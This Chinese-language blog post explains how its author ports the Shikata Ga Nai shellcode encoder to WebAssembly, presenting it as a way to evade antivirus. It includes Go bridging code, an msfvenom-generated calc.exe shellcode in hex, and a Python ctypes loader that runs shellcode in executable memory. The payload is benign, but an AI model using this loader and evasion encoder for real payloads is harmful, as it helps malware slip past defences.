---
categories:
- 开发
date: '2022-03-04T07:56:00.000Z'
showToc: true
tags:
- 工具
- 开发
title: 将Shikata ga nai带到前端

---



## Shikata ga nai是什么

Metasploit-Framework是一个漏洞利用框架，里面有大量的漏洞库，针对shellcode一些混淆编码器可以让用户bypass一些安全软件，其中一个比较核心的编码器是Shikata Ga Nai (SGN)。

shellcode 主要是机器码，也可以看作一段汇编指令。Metasploit 在默认配置下就会对payload进行编码。虽然 Metasploit 有各种编码器，但最受欢迎的是 SGN。日语中的短语 SGN 的意思是“无能为力”，之所以这样说，是因为它在创建时传统的反病毒产品难以检测。

检测 SGN 编码的payload很困难，尤其是在严重依赖静态检测的情况下。任何基于规则的静态检测机制基本上都无法检测到用 SGN 编码的payload。而不断扫描内存的计算成本很高，因此不太可行。这使得大多数杀软依赖于行为指标和沙箱进行检测。

## 为什么说带到前端

首先介绍下 [EgeBalci/sgn](https://github.com/EgeBalci/sgn)，这个项目将msf的Shikata Ga Nai编码器移植到了Golang，使得用户可以不通过msf即可享受到SGN的能力。

既然这个项目是非平台依赖的工具，那我们可以考虑将它移植到前端，这样用户只需要打开浏览器就能用了。

## 移植思路

首先我们可以考虑：sgn是一个golang项目，所以我们可以编译到wasm，然后暴露api给javascript来调用，这样就可以实现前端使用sgn了。

但是遇到了一些问题。

该项目并不是一个Pure Go项目，它依赖cgo，没办法编译到wasm。

但是我记得 [github.com/therecipe/qt](https://github.com/therecipe/qt) 可以编译到wasm，通过一些研究，发现它是采用了go-js-qt的桥接，qt是可以编译到wasm的，go也可以编译到wasm，然后两者之间再桥接起来。那我们可以尝试先将 [github.com/keystone-engine/keystone](http://github.com/keystone-engine/keystone) 编译到wasm，然后将sgn项目里面调用cgo的地方全部使用 syscall/js 桥接到keystone上去，此时sgn变成了一个Pure Go项目，可以将其编译到wasm了，然后再暴露出一个接口就可以供js使用了

## 实现手段

### cgo到桥接

sgn里面需要使用cgo是因为依赖 [github.com/EgeBalci/keystone-go](https://github.com/EgeBalci/keystone-go)，看了一下这个项目，其实是keystone的包装，keystone是一个c++写的项目，所以我们可以考虑使用 [emscripten](https://emscripten.org/) 来将keystone编译到wasm，不过该项工作已经有人做了，我们在这边就不自己再花时间搭环境编译了，可以看看 [alexaltea.github.io/keystone.js](https://alexaltea.github.io/keystone.js/)/ 

然后我们看看sgn里面依赖cgo的地方，主要是在 pkg/sgn.go

```go
package sgn

import (
	...
	"github.com/EgeBalci/keystone-go"
)

...
// Assemble assembes the given instructions
// and return a byte array with a boolean value indicating wether the operation is successful or not
func (encoder Encoder) Assemble(asm string) ([]byte, bool) {
	var mode keystone.Mode
	switch encoder.architecture {
	case 32:
		mode = keystone.MODE_32
	case 64:
		mode = keystone.MODE_64
	default:
		return nil, false
	}

	ks, err := keystone.New(keystone.ARCH_X86, mode)
	if err != nil {
		return nil, false
	}
	defer ks.Close()

	err = ks.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)
	if err != nil {
		return nil, false
	}
	//log.Println(asm)
	bin, _, ok := ks.Assemble(asm, 0)
	return bin, ok
}

// GetAssemblySize assembes the given  instructions and returns the total instruction size
// if assembly fails return value is -1
func (encoder Encoder) GetAssemblySize(asm string) int {
	var mode keystone.Mode
	switch encoder.architecture {
	case 32:
		mode = keystone.MODE_32
	case 64:
		mode = keystone.MODE_64
	default:
		return -1
	}

	ks, err := keystone.New(keystone.ARCH_X86, mode)
	if err != nil {
		return -1
	}
	defer ks.Close()

	err = ks.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)
	if err != nil {
		return -1
	}
	//log.Println(asm)
	bin, _, ok := ks.Assemble(asm, 0)

	if !ok {
		return -1
	}
	return len(bin)
}
...
```

其实工作量并不大，只是需要把所有对 keystone-go 的调用换到keystone.js上即可。

可以一步步按照 [https://pkg.go.dev/syscall/js](https://pkg.go.dev/syscall/js) 上面的api文档对照着改，这里我就不详细阐述语法了，之间将改动后的贴上来

```go
package sgn

import (
	...
	"syscall/js"
)

func GetKeystone() js.Value {
	return js.Global().Get("ks")
}

// Assemble assembes the given instructions
// and return a byte array with a boolean value indicating wether the operation is successful or not
func (encoder Encoder) Assemble(asm string) ([]byte, bool) {
	var mode js.Value
	switch encoder.architecture {
	case 32:
		mode = GetKeystone().Get("MODE_32")
	case 64:
		mode = GetKeystone().Get("MODE_64")
	default:
		return nil, false
	}

	keystoneFunc := GetKeystone().Get("Keystone")

	ks := keystoneFunc.New(GetKeystone().Get("ARCH_X86"), mode)
	if !ks.Truthy() {
		return nil, false
	}
	defer ks.Call("close")

	ks.Call("option", GetKeystone().Get("OPT_SYNTAX"), GetKeystone().Get("OPT_SYNTAX_INTEL"))
	v := ks.Call("asm", asm)
	if !v.Truthy() {
		return nil, false
	}
	ok := !v.Get("failed").Bool()
	if !v.Get("mc").Truthy() {
		return nil, false
	}
	var bin = make([]byte, v.Get("mc").Length())
	for i:=0; i<v.Get("mc").Length(); i++ {
		bin[i] = byte(v.Get("mc").Index(i).Int())
	}
	return bin, ok
}

// GetAssemblySize assembes the given  instructions and returns the total instruction size
// if assembly fails return value is -1
func (encoder Encoder) GetAssemblySize(asm string) int {
	var mode js.Value
	switch encoder.architecture {
	case 32:
		mode = GetKeystone().Get("MODE_32")
	case 64:
		mode = GetKeystone().Get("MODE_64")
	default:
		return -1
	}

	keystoneFunc := GetKeystone().Get("Keystone")

	ks := keystoneFunc.New(GetKeystone().Get("ARCH_X86"), mode)
	if !ks.Truthy() {
		return -1
	}
	defer ks.Call("close")

	ks.Call("option", GetKeystone().Get("OPT_SYNTAX"), GetKeystone().Get("OPT_SYNTAX_INTEL"))

	//log.Println(asm)
	v := ks.Call("asm", asm)
	if !v.Truthy() {
		return -1
	}
	ok := v.Get("failed").Bool()
	if !ok {
		return -1
	}
	if !v.Get("mc").Truthy() {
		return -1
	}
	return v.Get("mc").Length()
}
```

可以看到基本上就是使用 syscall/js 库按照 [keystone.js](https://alexaltea.github.io/keystone.js/) 的文档再把原先的实现一遍。

现在可以编译到wasm了 `GOARCH=wasm GOOS=js go build -trimpath -ldflags="-s -w"`

然后可以使用 [https://github.com/golang/go/blob/master/misc/wasm/go_js_wasm_exec](https://github.com/golang/go/blob/master/misc/wasm/go_js_wasm_exec) 运行测试下，我这里就不做了。

### api暴露

我们js调用wasm库，肯定需要一个api入口，我们可以将sgn的main入口改造一下

go编译到wasm后需要一个特殊的js文件加载下，具体需要 [https://github.com/golang/go/blob/master/misc/wasm/wasm_exec.js](https://github.com/golang/go/blob/master/misc/wasm/wasm_exec.js)

相关样例可以查看golang官方示例 [https://github.com/golang/go/blob/master/misc/wasm/wasm_exec.html](https://github.com/golang/go/blob/master/misc/wasm/wasm_exec.html)



然后我们可以将main函数改写一下

```go
func sgnExec(arch, encCount, obsLevel int, encDecoder, asciPayload, saveRegisters bool, badChars, input string) map[string]interface{} {
	var res = map[string]interface{}{
		"err": nil,
		"result": nil,
	}
	source, err := hex.DecodeString(strings.ReplaceAll(input, `\x`, ""))
	if err != nil {
		res["err"] = err
		return res
	}
	payload := []byte{}
	encoder := sgn.NewEncoder()
	encoder.ObfuscationLimit = obsLevel
	encoder.PlainDecoder = encDecoder
	encoder.EncodingCount = encCount
	encoder.SaveRegisters = saveRegisters
	eror(encoder.SetArchitecture(arch))

	if badChars != "" || asciPayload {
		badBytes, err := hex.DecodeString(strings.ReplaceAll(badChars, `\x`, ""))
		eror(err)

		for {
			p, err := encode(encoder, source)
			eror(err)

			if (asciPayload && isASCIIPrintable(string(p))) || (len(badBytes) > 0 && !containsBytes(p, badBytes)) {
				payload = p
				break
			}
			encoder.Seed = (encoder.Seed + 1) % 255
		}
	} else {
		payload, err = encode(encoder, source)
		eror(err)
	}
	res["result"] = hex.EncodeToString(payload)
	return res
}

```



sgnExec 实现了原先main的功能，只是把命令行参数改为了函数参数传入，然后我们把这个函数暴露给js，需要为 sgnExec 函数套一个壳，从 args[0] 获取入参，计算结果用 js.ValueOf 包装，并返回。



```go
func sgnFunc(this js.Value, args []js.Value) interface{} {
	arch := args[0].Int()
	encCount := args[1].Int()
	obsLevel := args[2].Int()
	encDecoder := args[3].Bool()
	asciPayload := args[4].Bool()
	saveRegisters := args[5].Bool()
	badChars := args[6].String()
	input := args[7].String()
	return js.ValueOf(sgnExec(arch, encCount, obsLevel, encDecoder, asciPayload, saveRegisters, badChars, input))
}
```



该函数将js传入的参数进行转换然后调用sgnExec并将结果返回

然后我们使用 js.Global().Set() 方法，将函数 sgnFunc 注册到全局，以便在浏览器中能够调用。



```go
func main() {
	done := make(chan int, 0)
	js.Global().Set("sgnFunc", js.FuncOf(sgnFunc))
	<-done
}
```



现在可以导入这个wasm，然后通过js来调用函数 sgnFunc 了。可以按照前面给出的golang官方示例写一个简陋的前端。下面会给出一个live demo



## 测试

首先我们先生成一个shellcode，这里我直接使用msf

```shell
$ ./msfvenom -p windows/x64/exec CMD=calc.exe -f hex
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 276 bytes
Final size of hex file: 552 bytes
fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500
```

然后我们快速写个py脚本执行测试下shellcode

```python
import ctypes
import sys

shellcode = bytes.fromhex(sys.argv[1].strip())

shellcode = bytearray(shellcode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))

# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
ctypes.c_uint64(ptr),
buf,
ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.c_uint64(ptr),
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

然后运行下原始的shellcode

![](https://raw.githubusercontent.com/akkuman/pic/master/notionimg/a5/d7/a5d7857774bc21cde20f0fc3f388fd23.png)

可以看到弹出了计算器

然后我们放在页面上编码混淆一下

![](https://raw.githubusercontent.com/akkuman/pic/master/notionimg/ad/2e/ad2e4cc4be007236caa8109673cd287a.png)

然后运行一下

![](https://raw.githubusercontent.com/akkuman/pic/master/notionimg/5a/63/5a637f25ab4e617616b3d8f497fec8df.png)

可以看到，shellcode功能正常。

## Live Demo

如果大家想在线体验一下，可以到 [http://hacktech.cn/sgn-html/](http://akkuman.github.io/sgn-html/) 体验一下。

## Reference

- [Shikata Ga Nai Encoder Still Going Strong](https://www.mandiant.com/resources/shikata-ga-nai-encoder-still-going-strong)

- [github.com/EgeBalci/sgn](http://github.com/EgeBalci/sgn)

- [Go WebAssembly (Wasm) 简明教程](https://geektutu.com/post/quick-go-wasm.html)

- [https://github.com/therecipe/qt/blob/master/qt_wasm.go](https://github.com/therecipe/qt/blob/master/qt_wasm.go)

- [How does CGO + WASM work?](https://github.com/therecipe/qt/issues/1196)



